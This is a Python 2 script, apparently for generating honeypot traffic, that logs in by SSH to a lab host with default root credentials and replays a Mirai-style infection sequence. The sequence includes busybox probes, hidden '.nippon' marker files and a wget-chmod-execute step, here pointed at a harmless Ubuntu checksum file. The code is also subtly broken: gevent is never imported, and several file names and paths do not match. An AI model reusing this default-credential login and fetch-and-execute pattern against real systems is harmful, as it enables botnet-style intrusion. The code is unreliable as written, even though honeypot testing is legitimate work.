#!/usr/bin/python2
import socket
import paramiko
import sys

def cipherspecTest(host):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host,2222))
    t = paramiko.Transport(sock)
    t.start_client()
    #k = t.get_remote_server_key()
    a = t.get_security_options()
    #print(t.host_key.__dict__)
    #print("ATTRS OF KEY: ", t.host_key.__dict__)
    print(str(t.host_key.size))

def commandTest(host):
    try:
        for i in range(1,101):
            client1 = paramiko.SSHClient()
            client1.load_system_host_keys()
            client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client1.connect(host,2222,'root','123456')
            client = client1.invoke_shell()

            while not client.recv_ready():
                gevent.sleep(0)

            welcome = ''
            while client.recv_ready():
                welcome += str(client.recv(1))
            lines = welcome.split('\r\n')
            promt = lines[-1] 
            client.send('/bin/busybox cp' + '\r\n')
            client.send('/gweerwe323f' + '\r\n')
            client.send('mount' + '\r\n')
            client.send('cat /bin/echo' + '\r\n')
            client.send('cd/' + '\r\n')

            client.send("echo -e '\x47\x72\x6f\x70/' > //.nippon" + '\r\n')
            client.send('cat //.nippon' + '\r\n')
            client.send('rm -f //.nippon' + '\r\n')

            client.send("echo -e '\x47\x72\x6f\x70/var/tmp' > /var/tmp/.nippon" + '\r\n')
            client.send('cat /var/tmp/.nippon' + '\r\n')
            client.send('rm -f /tmp/.nippon' + '\r\n')

            client.send("echo -e '\x47\x72\x6f\x70/lib/init/rw' > /lib/init/rw/.nippon" + '\r\n')
            client.send('cat /lib/init/rw/.nippon' + '\r\n')
            client.send('rm -f /var/tmp/.nippon' + '\r\n')

            client.send("echo -e '\x47\x72\x6f\x70/dev/pts' > /dev/pts/.nippon" + '\r\n')
            client.send('cat /dev/pts/.nippon' + '\r\n')
            client.send('rm -f /dev/pts/.nippon' + '\r\n')

            client.send("echo -e ' x47 x72 x6f x70/dev/shm' > /dev/shm/" + '\r\n')
            client.send('cat /dev/shm/.nippon' + '\r\n') 
            client.send('rm -f /dev/shm/.nippon' + '\r\n')

            client.send("echo -e '\x47\x72\x6f\x70/tmp' > /tmp/.nippom" + '\r\n')
            client.send('cat /tmp/.nippon' + '\r\n')
            client.send('rm -f /tmp/.nippon' + '\r\n')

            client.send('wget https://releases.ubuntu.com/18.04/SHA256SUMS -O - > usb_bus' + '\r\n')
            client.send('chmod 777 usb_bus' + '\r\n')
            client.send('./usb_bus' + '\r\n')

            client.send("echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon" + '\r\n')
            client.send('cat /dev/.nippon' + '\r\n')
            client.send('rm -f /dev/.nippon' + '\r\n')

            if i % 10 == 0:
                client.send('exit' + '\r\n')
            #Close connection
            client.close()

    except paramiko.ssh_exception.AuthenticationException: 
        print("Authentication Failure!")
        exit()

    except:
        print("Error to attack")

"""
if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('[+] Usage: python %s 1.1.1.1' % sys.argv[0])
        exit()
"""
host = "192.168.152.136"
cipherspecTest(host)
commandTest(host)
